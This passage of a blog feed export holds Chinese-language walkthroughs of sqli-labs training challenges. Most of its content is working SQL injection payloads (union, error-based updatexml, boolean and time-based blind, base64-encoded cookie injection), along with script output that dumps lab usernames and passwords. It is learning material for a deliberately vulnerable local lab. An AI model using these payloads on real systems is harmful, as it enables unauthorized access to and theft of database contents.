punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'ya8oopss6p'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +字段：secret_VCIW获取密码?id<span class="token operator">=</span>-1' and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select secret_VCIW from ya8oopss6p<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +密码：hS3pemAQq50IlYe5RRctDcPH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less54</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Please input the ID as parameter with numeric value as done in Lab excercises<br>请输入ID作为参数，数值与实验室练习相同</p><p>The objective of this challenge is to dump the (secret key) from only random table from Database (‘CHALLENGES’) in Less than 10 attempts<br>这个挑战的目标是在不到10次的尝试中从数据库（“CHALLENGES”）中仅转储随机表中的（密钥）</p><p>For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.<br>有趣的是，每次重置时，挑战都会产生随机的表名、列名和表数据。随时保持新鲜。</p></blockquote><p><a name="naIEd"></a></p><h1 id="判断字段数，"><a href="#判断字段数，" class="headerlink" title="判断字段数，"></a>判断字段数，</h1><p>用去两次机会</p><p><code>?id=1' order by 4--+</code></p><blockquote><p>You have made : 1 of 10 attempts<br>您已进行了：10次尝试中的1次</p></blockquote><p><code>?id=1' order by 3--+</code></p><blockquote><p>You have made : 2 of 10 attempts<br>Your Login name:Dumb<br>Your Password:Dumb</p></blockquote><p>直接省略信息收集，数据库猜解阶段， <a name="DK0D3"></a></p><h2 id="直接开始爆破数据表名称"><a href="#直接开始爆破数据表名称" class="headerlink" title="直接开始爆破数据表名称"></a>直接开始爆破数据表名称</h2><p><code>?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code></p><blockquote><p>You have made : 3 of 10 attempts<br>Your Login name:2<br>Your Password:aqzhac4it5</p></blockquote><p>数据表名：aqzhac4it5 <a name="Jpz4K"></a></p><h1 id="破数据字段名称"><a href="#破数据字段名称" class="headerlink" title="破数据字段名称"></a>破数据字段名称</h1><p><code>?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='aqzhac4it5'--+</code></p><blockquote><p>You have made : 4 of 10 attempts<br>Your Login name:2<br>Your Password:id,sessid,secret_9EA8,tryy</p></blockquote><p>数据字段：secret_9EA8 <a name="psE1z"></a></p><h1 id="最后找通关密码"><a href="#最后找通关密码" class="headerlink" title="最后找通关密码"></a>最后找通关密码</h1><p><code>?id=-1' union select 1,2,(select secret_9EA8  from aqzhac4it5 )--+</code></p><blockquote><p>You have made : 5 of 10 attempts<br>Your Login name:2<br>Your Password:FEC1PsNRKY3v1kumLxMCgYNa</p></blockquote><p>通关密码：FEC1PsNRKY3v1kumLxMCgYNa</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less10</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less9/less10/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less9/less10/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>双引号闭合</p><p><code>?id=1"</code>显示You are in………..<br><code>?id=1"</code>也显示You are in………..</p><p>与Less9的区别在于闭合方式为 双引号，<br>同样是时间盲注</p><p><a name="WFWr1"></a></p><h1 id="使用python时间盲注脚本"><a href="#使用python时间盲注脚本" class="headerlink" title="使用python时间盲注脚本"></a>使用python时间盲注脚本</h1><p><a href="https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822269804-e683f9ad-2d5c-4eda-bfe6-cdc0578a20b1.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822269804-e683f9ad-2d5c-4eda-bfe6-cdc0578a20b1.py%22,%22name%22:%22time-blind.py%22,%22size%22:3709,%22type%22:%22text/x-python%22,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22mode%22:%22title%22,%22download%22:true,%22taskId%22:%22uccc0b203-7879-4264-955e-69651a58aa2%22,%22taskType%22:%22upload%22,%22__spacing%22:%22both%22,%22id%22:%22ua027682d%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">time-blind.py</a></p><blockquote><p>url = ‘<a href="http://192.168.31.193/Less-10/?id=1">http://192.168.31.193/Less-10/?id=1</a>“‘</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/sql-python<span class="token punctuation">]</span>└─<span class="token comment"># python3 time-blind.py </span>数据库名为-<span class="token operator">&gt;</span>s数据库名为-<span class="token operator">&gt;</span>se数据库名为-<span class="token operator">&gt;</span>sec数据库名为-<span class="token operator">&gt;</span>secu数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>securt数据库名为-<span class="token operator">&gt;</span>securty第一个表为-<span class="token operator">&gt;</span>e第一个表为-<span class="token operator">&gt;</span>em第一个表为-<span class="token operator">&gt;</span>ema第一个表为-<span class="token operator">&gt;</span>emai第二个表为-<span class="token operator">&gt;</span>f第二个表为-<span class="token operator">&gt;</span>fe第三个表为-<span class="token operator">&gt;</span>s字段二为-<span class="token operator">&gt;</span>H字段二为-<span class="token operator">&gt;</span>H*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据库名为securty</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less8</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less7/less8/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less7/less8/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>?id=1'</code>没有报错显示，报错注入不能够实现注入了。<br><code>?id=1</code>显示You are in………..<br>&amp;#x20;对和错返回不同的页面回显，可以采用<strong>布尔盲注</strong>的方式， <a name="WUqxX"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p><a name="MJTYd"></a></p><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>?id=1' order by 4 --+</code>没有显示报错<br><code>?id=1' order by 3 --+</code>显示You are in<br>&amp;#x20;由此可以判断**字段数为3  ** <a name="cU19o"></a></p><h2 id="判断数据库名称长度"><a href="#判断数据库名称长度" class="headerlink" title="判断数据库名称长度"></a>判断数据库名称长度</h2><p><code>?id=-1 or length(database())&gt;8 --+</code>无内容<br><code>?id=-1 or length(database())=8</code>有内容<br>说明<strong>数据库长度为8</strong></p><blockquote><p>一般采用逻辑或，因为无法确保前面的条件一定为真</p></blockquote><p><a name="frb3M"></a></p><h3 id="逐一猜解数据库名称"><a href="#逐一猜解数据库名称" class="headerlink" title="逐一猜解数据库名称"></a>逐一猜解数据库名称</h3><p><a name="a5hHH"></a></p><h4 id="ascii表（部分）"><a href="#ascii表（部分）" class="headerlink" title="ascii表（部分）"></a>ascii表（部分）</h4><table><thead><tr><th>97</th><th>a</th></tr></thead><tbody><tr><td>98</td><td>b</td></tr><tr><td>99</td><td>c</td></tr><tr><td>100</td><td>d</td></tr><tr><td>101</td><td>e</td></tr><tr><td>102</td><td>f</td></tr><tr><td>103</td><td>g</td></tr><tr><td>104</td><td>h</td></tr><tr><td>105</td><td>i</td></tr><tr><td>106</td><td>j</td></tr><tr><td>107</td><td>k</td></tr><tr><td>108</td><td>l</td></tr><tr><td>109</td><td>m</td></tr><tr><td>110</td><td>n</td></tr><tr><td>111</td><td>o</td></tr><tr><td>112</td><td>p</td></tr><tr><td>113</td><td>q</td></tr><tr><td>114</td><td>r</td></tr><tr><td>115</td><td>s</td></tr><tr><td>116</td><td>t</td></tr><tr><td>117</td><td>u</td></tr><tr><td>118</td><td>v</td></tr><tr><td>119</td><td>w</td></tr><tr><td>120</td><td>x</td></tr><tr><td>121</td><td>y</td></tr><tr><td>122</td><td>z</td></tr></tbody></table><p><code>?id=-1' or ascii(substr(database(),1,1))&gt;115--+</code>无<br><code>?id=-1' or ascii(substr(database(),1,1))=115--+</code>有<br>第一个字符是s<br>…<br>或者<br><code> ?id=-1' or **ascii**(mid(database(),1,1))=115--+</code>有&amp;#x20;<br>…<br>或者<br><code>?id=-1' or mid(database(),1,1)='s'--+ </code>有<br>…</p><blockquote><p><strong>MID函数</strong>表示按照指定的条件对字符串进行截取。<br>语法结构：=MID(目标单元格，开始位置，截取长度)<br>注意：该函数的提取方法是从左往右提取指定的数据。</p></blockquote><br><a name="SzUFc"></a>## 猜解数据表名称`?id=-1' or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101--+`<br>第一个字符是e<a name="Y2AQJ"></a>## 猜解字段名称  `?id=-1' or ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))=105--+`<br>第一个字符是i<a name="RNwwH"></a>## 猜解字段内容`?id=-1' or ascii(mid((select group_concat(username,0x7e,password) from users),1,1))=68--+`<br>第一个字符是D<p>对于布尔盲注的问题，一般采用脚本进行猜解或者使用sqlmap\ <a name="kRQp0"></a></p><h1 id="使用python布尔盲注脚本"><a href="#使用python布尔盲注脚本" class="headerlink" title="使用python布尔盲注脚本"></a>使用python布尔盲注脚本</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root?guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/sql-python<span class="token punctuation">]</span>└─<span class="token comment"># python3 bool-blind.py    </span><span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始测试数据库名长度<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>数据库长度：8<span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始测试数据库名<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>数据库名：security开始测试security数据库有几张表<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span>security库一共有4张表<span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始猜解表名<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.第1张表名长度：6<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：emails第2张表名长度：8<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：referers第3张表名长度：7<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：uagents第4张表名长度：5<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：users<span class="token punctuation">[</span>+<span class="token punctuation">]</span>security库下的4张表：<span class="token punctuation">[</span><span class="token string">'emails'</span>, <span class="token string">'referers'</span>, <span class="token string">'uagents'</span>, <span class="token string">'users'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始猜解每张表的字段数：<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>emails表<span class="token number">2</span>个字段<span class="token punctuation">[</span>+<span class="token punctuation">]</span>referers表<span class="token number">3</span>个字段<span class="token punctuation">[</span>+<span class="token punctuation">]</span>uagents表<span class="token number">4</span>个字段<span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表<span class="token number">3</span>个字段<span class="token punctuation">[</span>+<span class="token punctuation">]</span>表对应的字段数：<span class="token punctuation">[</span><span class="token number">2</span>, <span class="token number">3</span>, <span class="token number">4</span>, <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始猜解每张表的字段名<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>emails表的字段：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：email_id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>referers表的字段：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：referer<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：ip_address<span class="token punctuation">[</span>+<span class="token punctuation">]</span>uagents表的字段：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：uagent<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：ip_address<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：username<span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表的字段：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：username<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：password<span class="token punctuation">[</span>-<span class="token punctuation">]</span>对users表的<span class="token punctuation">[</span><span class="token string">'id'</span>, <span class="token string">'username'</span>, <span class="token string">'password'</span><span class="token punctuation">]</span>字段进行爆破<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表中的id字段有以下13条数据：<span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">1</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">2</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">3</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">4</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">5</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">6</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">7</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">8</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">9</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">10</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">11</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">12</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">14</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表中的username字段有以下13条数据：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Dumb<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Angelina<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Dummy<span class="token punctuation">[</span>+<span class="token punctuation">]</span>secure<span class="token punctuation">[</span>+<span class="token punctuation">]</span>stupid<span class="token punctuation">[</span>+<span class="token punctuation">]</span>superman<span class="token punctuation">[</span>+<span class="token punctuation">]</span>batman<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin1<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin2<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin3<span class="token punctuation">[</span>+<span class="token punctuation">]</span>dhakkan<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin4<span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表中的password字段有以下13条数据：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Dumb<span class="token punctuation">[</span>+<span class="token punctuation">]</span>I-kill-you<span class="token punctuation">[</span>+<span class="token punctuation">]</span>p@ssword<span class="token punctuation">[</span>+<span class="token punctuation">]</span>crappy<span class="token punctuation">[</span>+<span class="token punctuation">]</span>stupidity<span class="token punctuation">[</span>+<span class="token punctuation">]</span>genious<span class="token punctuation">[</span>+<span class="token punctuation">]</span>mob<span class="token operator">!</span>le<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin1<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin2<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin3<span class="token punctuation">[</span>+<span class="token punctuation">]</span>dumbo<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less22</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/less22/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/less22/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$cookee</span> <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span><span class="token variable">$cookee</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cookee1</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span> <span class="token variable">$cookee</span><span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">"&lt;br&gt;&lt;/font&gt;"</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE username=<span class="token variable">$cookee1</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与Less21的唯一区别在于此关闭合方式为双引号”</p><p>成功登录后发现在Cookie处登录的信息被进行了加密，</p><blockquote><p>YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36<br>YOUR IP ADDRESS IS : 192.168.31.119<br>DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE<br>YOUR COOKIE : uname = YWRtaW4= and expires: Wed 16 Nov 2022 - 20:58:46<br>Your Login name:admin<br>Your Password:admin<br>Your ID:8</p></blockquote><p><a name="DsPkr"></a></p><h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p><code>uname=admin" order by 4-- +</code><br>先将语句进行base64加密，再进行注入，<br><code>uname=YWRtaW4iIG9yZGVyIGJ5IDQtLSAr</code></p><blockquote><p>Issue with your mysql: Unknown column ‘4’ in ‘order clause’</p></blockquote><p><a name="Tcgou"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">" union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)-- +uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKS0tICs=爆破数据表名uname=admin"</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema <span class="token operator">=</span> database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span class="token assign-left variable">uname</span><span class="token operator">=</span>YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSA9IGRhdGFiYXNlKCkpLDB4N2UpLDEpLS0gKw<span class="token operator">==</span>爆破字段名<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">" union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)-- +uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCAoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIGxpbWl0IDgsMSksMHg3ZSksMSktLSAr爆破字段uname=admin"</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin" union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less21</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/less21/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/less21/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE username=('<span class="token variable">$cookee</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">" Your Cookie is deleted"</span><span class="token punctuation">;</span>setcookie<span class="token punctuation">(</span><span class="token string">'uname'</span>, base64_encode<span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>, time<span class="token punctuation">(</span><span class="token punctuation">)</span>-3600<span class="token punctuation">)</span><span class="token punctuation">;</span>header <span class="token punctuation">(</span><span class="token string">'Location: index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>闭合方式’)</p><p>成功登录后发现在Cookie处登录的信息被进行了加密，</p><blockquote><p>YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36<br>YOUR IP ADDRESS IS : 192.168.31.119<br>DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE<br>YOUR COOKIE : <strong>uname = YWRtaW4=</strong> and expires: Wed 16 Nov 2022 - 20:04:08<br>Your Login name:admin<br>Your Password:admin<br>Your ID:8</p></blockquote><p>说明在客户端登录的信息被进行了加密 &amp;#x20;<br>** base64解码**YWRtaW4=为admin<br>可以尝试在每次注入前对payload进行加密再注入</p><p><a name="DsPkr"></a></p><h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p><code>uname=admin' order by 4 -- +</code><br>先将语句进行base64加密，再进行注入，<br><code>uname=YWRtaW4nIG9yZGVyIGJ5IDQgLS0gKw==</code></p><blockquote><p>Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘order by 4 – +’) LIMIT 0,1’ at line 1</p></blockquote><p>通过回显找到闭合方式为’)\ <a name="mqKGp"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">') union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)-- +uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSktLSAr爆破数据表名uname=admin'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema <span class="token operator">=</span> database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span class="token assign-left variable">uname</span><span class="token 